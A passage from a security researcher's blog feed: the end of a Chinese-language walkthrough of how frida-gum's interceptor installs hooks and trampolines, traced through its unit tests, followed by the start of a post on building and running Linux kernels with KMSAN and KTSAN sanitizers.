href="#0x03-è°ƒè¯•åˆ†æå¸®åŠ©ç†è§£" class="headerlink" title="0x03 : è°ƒè¯•åˆ†æå¸®åŠ©ç†è§£"></a>0x03 : è°ƒè¯•åˆ†æå¸®åŠ©ç†è§£</h2><p>è¿™é‡Œè°ƒè¯•äº†å•å…ƒæµ‹è¯•ä¸­å†™hookå’Œå‡½æ•°æ›¿æ¢çš„é€»è¾‘ï¼Œè¿‡ç¨‹å¦‚ä¸‹ï¼š</p><p><code>_gum_interceptor_backend_create() </code></p><p>åç«¯åˆå§‹åŒ–ï¼Œåˆå§‹åŒ–ä¸¤ä¸ªthunk</p><p>enter_thunk</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">00C30000  pushfd  </span><br><span class="line">00C30001  cld  </span><br><span class="line">00C30002  pushad  </span><br><span class="line">00C30003  lea         esp,[esp-4]  </span><br><span class="line">00C3000A  lea         eax,[esp+2Ch]  </span><br><span class="line">00C30011  mov         dword ptr [esp+10h],eax  </span><br><span class="line">00C30015  mov         ebx,dword ptr [esp+28h]  </span><br><span class="line">00C30019  mov         ebp,esp  </span><br><span class="line">00C3001B  and         esp,0FFFFFFF0h  </span><br><span class="line">00C30021  sub         esp,200h  </span><br><span class="line">00C30027  fxsave      [esp]  </span><br><span class="line">00C3002B  lea         esi,[ebp]  </span><br><span class="line">00C30031  lea         edx,[ebp+2Ch]  </span><br><span class="line">00C30037  lea         ecx,[ebp+28h]  </span><br><span class="line">00C3003D  push        ecx  </span><br><span class="line">00C3003E  push        edx  </span><br><span class="line">00C3003F  push        esi  </span><br><span class="line">00C30040  push        ebx  </span><br><span class="line">00C30041  call        __gum_function_context_begin_invocation (0CE8E1Fh)  </span><br><span class="line">00C30046  add         esp,10h  </span><br><span class="line">00C30049  fxrstor     [esp]  </span><br><span class="line">00C3004D  mov         esp,ebp  </span><br><span class="line">00C3004F  lea         esp,[esp+4]  </span><br><span class="line">00C30056  popad  </span><br><span class="line">00C30057  popfd  </span><br><span class="line">00C30058  ret </span><br></pre></td></tr></table></figure><p>leave_thunk</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">00C30100  pushfd  </span><br><span class="line">00C30101  cld  </span><br><span class="line">00C30102  pushad  </span><br><span class="line">00C30103  lea         esp,[esp-4]  </span><br><span class="line">00C3010A  lea         eax,[esp+28h]  </span><br><span class="line">00C30111  mov         dword ptr [esp+10h],eax  </span><br><span class="line">00C30115  mov         ebx,dword ptr [esp+28h]  </span><br><span class="line">00C30119  mov         ebp,esp  </span><br><span class="line">00C3011B  and         esp,0FFFFFFF0h  </span><br><span class="line">00C30121  sub         esp,200h  </span><br><span class="line">00C30127  fxsave      [esp]  </span><br><span class="line">00C3012B  lea         esi,[ebp]  </span><br><span class="line">00C30131  lea         edx,[ebp+28h]  </span><br><span class="line">00C30137  sub         esp,4  </span><br><span class="line">00C3013A  push        edx  </span><br><span class="line">00C3013B  push        esi  </span><br><span class="line">00C3013C  push        ebx  </span><br><span class="line">00C3013D  call        __gum_function_context_end_invocation (0CEAB1Bh)  </span><br><span class="line">00C30142  add         esp,0Ch  </span><br><span class="line">00C30145  add         esp,4  </span><br><span class="line">00C30148  fxrstor     [esp]  </span><br><span class="line">00C3014C  mov         esp,ebp  </span><br><span class="line">00C3014E  lea         esp,[esp+4]  </span><br><span class="line">00C30155  popad  </span><br><span class="line">00C30156  popfd  </span><br><span class="line">00C30157  ret  </span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// hook æ„é€ </span></span><br><span class="line">GumAttachReturn</span><br><span class="line">gum_interceptor_attach (GumInterceptor * self,</span><br><span class="line">                        gpointer function_address,</span><br><span class="line">                        GumInvocationListener * listener,</span><br><span class="line">                        gpointer listener_function_data)</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line">GumAttachReturn</span><br><span class="line">gum_interceptor_attach (GumInterceptor * self,</span><br><span class="line">                        gpointer function_address,</span><br><span class="line">                        GumInvocationListener * listener,</span><br><span class="line">                        gpointer listener_function_data)</span><br><span class="line">&#123;</span><br><span class="line">  GumAttachReturn result = GUM_ATTACH_OK;</span><br><span class="line">  GumFunctionContext * function_ctx;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (gum_process_get_code_signing_policy () == GUM_CODE_SIGNING_REQUIRED)</span><br><span class="line">    <span class="keyword">goto</span> policy_violation;</span><br><span class="line"></span><br><span class="line">  gum_interceptor_ignore_current_thread (self);</span><br><span class="line">  GUM_INTERCEPTOR_LOCK (self);</span><br><span class="line">  gum_interceptor_transaction_begin (&amp;self-&gt;current_transaction);</span><br><span class="line">  self-&gt;current_transaction.is_dirty = TRUE;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// è·å–hookç›®æ ‡å‡½æ•°çš„åœ°å€ </span></span><br><span class="line">  function_address = gum_interceptor_resolve (self, function_address);</span><br><span class="line">  </span><br><span class="line">  <span class="comment">// è·å–è¿™ä¸ªå‡½æ•°çš„ GumFunctionContext å¯¹è±¡</span></span><br><span class="line">  <span class="comment">// æ²¡æœ‰å°±æ–°å»ºä¸€ä¸ª</span></span><br><span class="line">  <span class="comment">// è¿™é‡Œå·²ç» å‡†å¤‡å¥½äº†è·³æ¿ï¼Œå†™å¥½äº†hook</span></span><br><span class="line">  <span class="comment">// æ·»åŠ ä»»åŠ¡,è®¾ç½®ç›¸å¯¹åº”çš„å›è°ƒå‡½æ•°</span></span><br><span class="line">  function_ctx = gum_interceptor_instrument (self, function_address);</span><br><span class="line">  <span class="keyword">if</span> (function_ctx == <span class="literal">NULL</span>)</span><br><span class="line">    <span class="keyword">goto</span> wrong_signature;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (gum_function_context_has_listener (function_ctx, listener))</span><br><span class="line">    <span class="keyword">goto</span> already_attached;</span><br><span class="line">  <span class="comment">// æ·»åŠ ç›‘å¬å™¨</span></span><br><span class="line">  gum_function_context_add_listener (function_ctx, listener,</span><br><span class="line">      listener_function_data);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">goto</span> beach;</span><br><span class="line"></span><br><span class="line">policy_violation:</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">return</span> GUM_ATTACH_POLICY_VIOLATION;</span><br><span class="line">  &#125;</span><br><span class="line">wrong_signature:</span><br><span class="line">  &#123;</span><br><span class="line">    result = GUM_ATTACH_WRONG_SIGNATURE;</span><br><span class="line">    <span class="keyword">goto</span> beach;</span><br><span class="line">  &#125;</span><br><span class="line">already_attached:</span><br><span class="line">  &#123;</span><br><span class="line">    result = GUM_ATTACH_ALREADY_ATTACHED;</span><br><span class="line">    <span class="keyword">goto</span> beach;</span><br><span class="line">  &#125;</span><br><span class="line">beach:</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="comment">// åˆ°è¿™é‡Œï¼ŒåŸºæœ¬æ²¡ä»€ä¹ˆé—®é¢˜ï¼Œhookä»€ä¹ˆéƒ½æ‰“å¥½äº†</span></span><br><span class="line">    <span class="comment">// æ‹¦æˆªå™¨æ¿€æ´» è·³æ¿æ¿€æ´»</span></span><br><span class="line">    <span class="comment">// è¿™é‡ŒæŠŠåŸå‡½æ•°å¼€å¤´æ”¹å†™</span></span><br><span class="line">    gum_interceptor_transaction_end (&amp;self-&gt;current_transaction);</span><br><span class="line">    GUM_INTERCEPTOR_UNLOCK (self);</span><br><span class="line">    gum_interceptor_unignore_current_thread (self);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> result;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>on_invoke_trampoline è·³æ¿</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">00C30200  mov         al,byte ptr ds:[FF00C121h]  </span><br><span class="line">00C30205  xor         eax,0C30200h  </span><br><span class="line">00C3020A  jmp         00C30000   &#x2F;&#x2F; è·³åˆ°ä¸Šé¢çš„ enter_thunk</span><br><span class="line">00C3020F  push        dword ptr ds:[0C30200h]  </span><br><span class="line">00C30215  jmp         00C30100  &#x2F;&#x2F; è·³åˆ° leave_thunk</span><br><span class="line">&#x2F;&#x2F; åŸå‡½æ•°ä¿®å¤çš„æŒ‡ä»¤ï¼Œ7ä¸ªå­—èŠ‚</span><br><span class="line">00C3021A  push        ebp  </span><br><span class="line">00C3021B  mov         ebp,esp  </span><br><span class="line">00C3021D  cmp         dword ptr [ebp+8],0  </span><br><span class="line">00C30221  jmp         gum_test_target_function+7h (0D6FB97h) &#x2F;&#x2F; è·³å›åŸå‡½æ•°ï¼Œå› ä¸ºå†™è·³è½¬ç”¨äº†7å­—èŠ‚ï¼Œæ‰€ä»¥+7</span><br></pre></td></tr></table></figure><p><code>gum_interceptor_transaction_end (&amp;self-&gt;current_transaction);</code> è°ƒç”¨ <code>gum_interceptor_activate()</code> ç„¶å<code>_gum_interceptor_backend_activate_trampolie()</code> éšåï¼Œç›®æ ‡å‡½æ•°å¼€å¤´è¢«ä¿®æ”¹ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">gpointer GUM_NOINLINE</span><br><span class="line">gum_test_target_function (GString * str)</span><br><span class="line">&#123;</span><br><span class="line"><span class="number">00</span>D6FB90  jmp         <span class="number">00</span>C30204  </span><br><span class="line">  <span class="keyword">if</span> (str != <span class="literal">NULL</span>)</span><br><span class="line"><span class="number">00</span>D6FB95  nop  </span><br><span class="line"><span class="number">00</span>D6FB96  nop  </span><br><span class="line"><span class="number">00</span>D6FB97  je          gum_test_target_function+<span class="number">19</span>h (<span class="number">0</span>D6FBA9h)  </span><br></pre></td></tr></table></figure><p>ç›´æ¥è·³è½¬åˆ° <code>00C30204</code>, å…¶å®å°±æ˜¯ è·³æ¿ï¼Œå› ä¸ºåæ±‡ç¼–çš„åœ°å€å·®äº†ç‚¹ï¼Œæ‰€ä»¥å¼€å§‹çš„æŒ‡ä»¤ä¸å¤ªä¸€æ ·:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">00C30204  push        dword ptr ds:[0C30200h]  </span><br><span class="line">00C3020A  jmp         00C30000  </span><br><span class="line">00C3020F  push        dword ptr ds:[0C30200h]  </span><br><span class="line">00C30215  jmp         00C30100  </span><br><span class="line">00C3021A  push        ebp  </span><br><span class="line">00C3021B  mov         ebp,esp  </span><br><span class="line">00C3021D  cmp         dword ptr [ebp+8],0  </span><br><span class="line">00C30221  jmp         gum_test_target_function+7h (0D6FB97h)  </span><br><span class="line">00C30226  add         byte ptr [eax],al  </span><br><span class="line">00C30228  add         byte ptr [eax],al  </span><br><span class="line">00C3022A  add         byte ptr [eax],al  </span><br><span class="line">00C3022C  add         byte ptr [eax],al  </span><br><span class="line">00C3022E  add         byte ptr [eax],al  </span><br></pre></td></tr></table></figure><p>è°ƒç”¨æµç¨‹è°ƒè¯•åˆ†æï¼Œè¿™é‡Œåˆ†ä¸¤ä¸ªæƒ…å†µï¼Œæ˜¯å¦å­˜åœ¨``replacement_function`</p><p>é¦–å…ˆæ˜¯ä¸å­˜åœ¨ï¼Œåªæ˜¯æ‰“ä¸ªhook(æ ¹æ® <code>TESTCASE(attach_one);</code>)</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">call åŸå‡½æ•°</span><br><span class="line">----------------------------------------------------</span><br><span class="line">åŸå‡½æ•°</span><br><span class="line">----------------------------------------------------</span><br><span class="line">è·³æ¿</span><br><span class="line">----------------------------------------------------</span><br><span class="line">&#96;enter_chunk&#96;  &#x2F;&#x2F; é¦–å…ˆè¦ä¿å­˜ç°åœº, æ„é€ æ ˆå¸§ï¼Œéšåè¿›å…¥ä¸‹ä¸€ä¸ªå‡½æ•° â¬‡ï¸</span><br><span class="line">&#96;__gum_function_context_begin_invocation&#96; &#x2F;&#x2F; é€šè¿‡è®¾ç½®æ ˆ(ret addr)æ§åˆ¶æ‰§è¡Œæµç¨‹ </span><br><span class="line">----------------------------------------------------</span><br><span class="line">è·³æ¿+n  (00C3021A) &#x2F;&#x2F; æ‰§è¡ŒåŸå‡½æ•°çš„ ä¿®å¤çš„è‹¥å¹²å­—èŠ‚</span><br><span class="line">----------------------------------------------------</span><br><span class="line">åŸå‡½æ•°</span><br><span class="line">----------------------------------------------------</span><br><span class="line">&#96;leave_chunk&#96; </span><br><span class="line">&#96;__gum_function_context_end_invocation&#96;</span><br><span class="line">----------------------------------------------------</span><br><span class="line">ç»§ç»­æ‰§è¡Œ....</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>å­˜åœ¨æ›¿æ¢çš„å‡½æ•°(<code>TESTCASE(replace_one);</code>)</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">åŸå‡½æ•°</span><br><span class="line">----------------------------------------------------</span><br><span class="line">è·³æ¿ 02C80204</span><br><span class="line">----------------------------------------------------</span><br><span class="line">&#96;enter_chunk&#96;  &#x2F;&#x2F; é¦–å…ˆè¦ä¿å­˜ç°åœº, æ„é€ æ ˆå¸§ï¼Œéšåè¿›å…¥ä¸‹ä¸€ä¸ªå‡½æ•° â¬‡ï¸</span><br><span class="line">&#96;__gum_function_context_begin_invocation&#96; &#x2F;&#x2F; é€šè¿‡è®¾ç½®æ ˆ(ret addr)æ§åˆ¶æ‰§è¡Œæµç¨‹ </span><br><span class="line">----------------------------------------------------</span><br><span class="line">replacement_function</span><br><span class="line">----------------------------------------------------</span><br><span class="line">è·³æ¿ 02C8020F</span><br><span class="line">----------------------------------------------------</span><br><span class="line">&#96;leave_chunk&#96;</span><br><span class="line">&#96;__gum_function_context_end_invocation&#96; </span><br><span class="line">----------------------------------------------------</span><br><span class="line">ç»§ç»­æ‰§è¡Œ</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>replace_one çš„è·³æ¿</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">02C80204  push        dword ptr ds:[2C80200h]  </span><br><span class="line">02C8020A  jmp         02C80000  </span><br><span class="line">02C8020F  push        dword ptr ds:[2C80200h]  </span><br><span class="line">02C80215  jmp         02C80100  </span><br><span class="line">02C8021A  mov         edi,edi  </span><br><span class="line">02C8021C  push        ebp  </span><br><span class="line">02C8021D  mov         ebp,esp  </span><br><span class="line">02C8021F  jmp         malloc+5h (01E5A7B5h)  </span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="0x04-ç»“è¯­"><a href="#0x04-ç»“è¯­" class="headerlink" title="0x04 : ç»“è¯­"></a>0x04 : ç»“è¯­</h2><p>è¿™ä¸ªè¿‡ç¨‹å¤§æ¦‚èŠ±äº†æˆ‘ä¸€å‘¨ 5å¤©å¤šçš„æ ·å­ï¼ŒæŒºéš¾çš„ä¸ªäººæ„Ÿè§‰ï¼Œéœ€è¦æ‹æ¸…æ¥šçš„è¯ï¼Œé…åˆè°ƒè¯•ä¼šå¥½å¾ˆå¤šï¼Œæœ€å¼€å§‹æˆ‘ç›´æ¥çœ‹çš„ä»£ç ï¼Œçœ‹+åšç¬”è®°ï¼Œè„‘å†…debugï¼Œæœ€åç¼–è¯‘äº†å·¥ç¨‹ï¼Œvsè°ƒè¯•ï¼Œæ¸…æ™°å¤šäº†ï¼Œè¿˜æ˜¯å»ºè®®è¾¹è°ƒè¯•è¾¹çœ‹ã€‚</p><p>å¦‚æœæ–‡ä¸­æœ‰ä»»ä½•é—®é¢˜ï¼Œæ¬¢è¿æ‰¹è¯„æŒ‡æ­£  : ) </p><p>åé¢å¯èƒ½ä¼šåœ¨ä»–åŸºç¡€ä¸Šåšç‚¹äº‹æƒ…å§â€¦è¿™æ¡†æ¶çœŸç‰›é€¼ !</p><h2 id="0x05-å‚è€ƒä¸å¼•ç”¨"><a href="#0x05-å‚è€ƒä¸å¼•ç”¨" class="headerlink" title="0x05 : å‚è€ƒä¸å¼•ç”¨"></a>0x05 : å‚è€ƒä¸å¼•ç”¨</h2><p><a href="https://jmpews.github.io/2017/06/27/pwn/frida-gum%E6%BA%90%E7%A0%81%E8%A7%A3%E8%AF%BB/"><a href="https://jmpews.github.io/2017/06/27/pwn/frida-gum%E6%BA%90%E7%A0%81%E8%A7%A3%E8%AF%BB/">rida-gumæºç è§£è¯»</a></a></p><p><a href="https://blog.csdn.net/yanbixing123/article/details/52970804">gobject cè¯­è¨€</a></p><p><a href="https://bbs.pediy.com/thread-220794.htm">å¦‚ä½•æ„å»ºä¸€æ¬¾åƒ frida ä¸€æ ·çš„æ¡†æ¶</a></p>]]></content>
    
    
    <summary type="html">&lt;h2 id=&quot;0x00-å‰è¨€ä¸é¢„å¤‡çŸ¥è¯†&quot;&gt;&lt;a href=&quot;#0x00-å‰è¨€ä¸é¢„å¤‡çŸ¥è¯†&quot; class=&quot;headerlink&quot; title=&quot;0x00 : å‰è¨€ä¸é¢„å¤‡çŸ¥è¯†&quot;&gt;&lt;/a&gt;0x00 : å‰è¨€ä¸é¢„å¤‡çŸ¥è¯†&lt;/h2&gt;&lt;p&gt;&lt;code&gt;frida&lt;/code&gt; :  fridaæ˜¯ä¸€ä¸ªä¼˜ç§€çš„è·¨å¹³å°&lt;code&gt;Dynamic instrumentation toolkit&lt;/code&gt;ï¼Œå…·ä½“å¯ä»¥çœ‹&lt;a href=&quot;https://www.frida.re/&quot;&gt;å®˜ç½‘ä»‹ç»&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://www.ibm.com/developerworks/cn/linux/l-gobject/index.html&quot;&gt;GObjectå¯¹è±¡ç³»ç»Ÿ&lt;/a&gt;&lt;/p&gt;</summary>
    
    
    
    <category term="å­¦ä¹ è®°å½•" scheme="http://o0xmuhe.me/categories/%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/"/>
    
    
    <category term="frida" scheme="http://o0xmuhe.me/tags/frida/"/>
    
  </entry>
  
  <entry>
    <title>Linux Kernel ç¼–è¯‘è¸©å‘</title>
    <link href="http://o0xmuhe.me/2019/10/24/Linux-Kernel-%E7%BC%96%E8%AF%91%E8%B8%A9%E5%9D%91/"/>
    <id>http://o0xmuhe.me/2019/10/24/Linux-Kernel-%E7%BC%96%E8%AF%91%E8%B8%A9%E5%9D%91/</id>
    <published>2019-10-24T02:42:04.000Z</published>
    <updated>2020-06-20T11:11:28.000Z</updated>
    
    <content type="html"><![CDATA[<h2 id="env-config"><a href="#env-config" class="headerlink" title="env config"></a>env config</h2><p><code>ubuntu 18.04 amd64</code></p><a id="more"></a><h3 id="gcc-8"><a href="#gcc-8" class="headerlink" title="gcc-8"></a>gcc-8</h3><p>works on ubuntu 16.04 and 18.04</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">sudo add-apt-repository ppa:ubuntu-toolchain-r/<span class="built_in">test</span></span><br><span class="line">sudo apt-get update</span><br><span class="line">sudo apt-get install gcc-8 g++-8</span><br><span class="line">gcc-8 --version</span><br></pre></td></tr></table></figure><h3 id="clang"><a href="#clang" class="headerlink" title="clang"></a>clang</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">R=348261</span><br><span class="line">svn co -r <span class="variable">$R</span> http://llvm.org/svn/llvm-project/llvm/trunk llvm</span><br><span class="line"><span class="built_in">cd</span> llvm</span><br><span class="line">(<span class="built_in">cd</span> tools &amp;&amp; svn co -r <span class="variable">$R</span> http://llvm.org/svn/llvm-project/cfe/trunk clang)</span><br><span class="line">(<span class="built_in">cd</span> projects &amp;&amp; svn co -r <span class="variable">$R</span> http://llvm.org/svn/llvm-project/compiler-rt/trunk compiler-rt)</span><br><span class="line">mkdir llvm_cmake_build &amp;&amp; <span class="built_in">cd</span> llvm_cmake_build</span><br><span class="line">cmake -DCMAKE_BUILD_TYPE=Release -DLLVM_ENABLE_ASSERTIONS=ON ../</span><br><span class="line">make -j64 clang</span><br><span class="line"><span class="built_in">export</span> KMSAN_CLANG_PATH=`<span class="built_in">pwd</span>`/bin/clang</span><br></pre></td></tr></table></figure><p>æ–‡æ¡£é‡Œ<code>-j64</code>çœŸçš„å¥¢åâ€¦</p><h3 id="qemu-kvm"><a href="#qemu-kvm" class="headerlink" title="qemu kvm"></a>qemu kvm</h3><p>è¿™éƒ¨åˆ†æ¨èæ‰‹åŠ¨ç¼–è¯‘æœ€æ–°ç‰ˆæœ¬/è¾ƒæ–°ç‰ˆæœ¬ï¼Œç›´æ¥aptå®‰è£…çš„ç‰ˆæœ¬æœ‰ç‚¹è€ï¼Œåé¢å¯èƒ½æœ‰å½±å“ã€‚</p><p>åŸºæœ¬æ²¡å•¥å‘ï¼Œå°±æ˜¯è€—æ—¶è€—åŠ› :(</p><h2 id="build-kernel"><a href="#build-kernel" class="headerlink" title="build kernel"></a>build kernel</h2><h3 id="mainline"><a href="#mainline" class="headerlink" title="mainline"></a>mainline</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">make menuconfig</span><br><span class="line">cp path/to/config .config</span><br><span class="line">make bzImage -j2</span><br></pre></td></tr></table></figure><h3 id="linux-next"><a href="#linux-next" class="headerlink" title="linux-next"></a>linux-next</h3><p>ä¸€æ ·çš„ç¼–è¯‘è¿‡ç¨‹ï¼Œnextåªæ˜¯ä»£ç æ¯”è¾ƒæ¿€è¿›çš„ç‰ˆæœ¬</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">make menuconfig</span><br><span class="line">cp path/to/config .config</span><br><span class="line">make bzImage -j2</span><br></pre></td></tr></table></figure><h3 id="kmsan"><a href="#kmsan" class="headerlink" title="kmsan"></a>kmsan</h3><p>è·Ÿç€readmeèµ°å°±è¡Œäº†</p><p>é‡åˆ°ä¸€ä¸ªå‘ç‚¹ï¼Œ</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">export</span> KMSAN_CLANG_PATH=`<span class="built_in">pwd</span>`/bin/clang</span><br><span class="line">...</span><br><span class="line">make CC=<span class="variable">$KMSAN_CLANG_PATH</span> -j64 -k 2&gt;&amp;1 | tee build.log</span><br></pre></td></tr></table></figure><p>ç›´æ¥è¿™ä¹ˆç¼–è¯‘æœ‰é—®é¢˜ï¼Œè¯•äº†å‡ æ¬¡éƒ½ä¸è¡Œï¼Œæç¤ºè¯´ç¼–è¯‘å™¨ä¸æ”¯æŒxxxxè¿™ç±»é—®é¢˜ã€‚<br>æœ€åæˆ‘å°è¯•äº†:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">export</span> CC=/path/to/clang</span><br></pre></td></tr></table></figure><p>ä¹‹åç›´æ¥ç¼–è¯‘å°±æ²¡é—®é¢˜äº†</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">make bzImage -j2</span><br></pre></td></tr></table></figure><p>è¿™ä¸ªç‰ˆæœ¬æˆ‘åé¢å¼„äº†ä¸ªæ›´æ–°ç‰ˆæœ¬çš„clangä¹Ÿå¯ä»¥ç›´æ¥ç¼–è¯‘è¿‡ã€‚</p><h3 id="ktsan"><a href="#ktsan" class="headerlink" title="ktsan"></a>ktsan</h3><p>ç¼–è¯‘æ²¡å•¥å‘ï¼Œå°±æ˜¯æ³¨æ„<code>.config</code>æ–‡ä»¶åˆ«ä¹±æ”¹ã€‚</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">git <span class="built_in">clone</span> https://github.com/google/ktsan.git</span><br><span class="line"><span class="built_in">cd</span> ktsan/</span><br><span class="line">make defconfig</span><br><span class="line">make kvmconfig</span><br><span class="line">scripts/config -e KTSAN -e SLAB -d SLUB -e DEBUG_INFO</span><br><span class="line">yes <span class="string">&#x27;&#x27;</span> | make oldconfig</span><br><span class="line">make -j2 LOCALVERSION=-tsan</span><br></pre></td></tr></table></figure><h2 id="run-kernel"><a href="#run-kernel" class="headerlink" title="run kernel"></a>run kernel</h2><p>åˆ›å»ºæ–‡ä»¶ç³»ç»Ÿ</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">IMG=qemu-image.img</span><br><span class="line">DIR=mount-point.dir</span><br><span class="line">qemu-img create <span class="variable">$IMG</span> 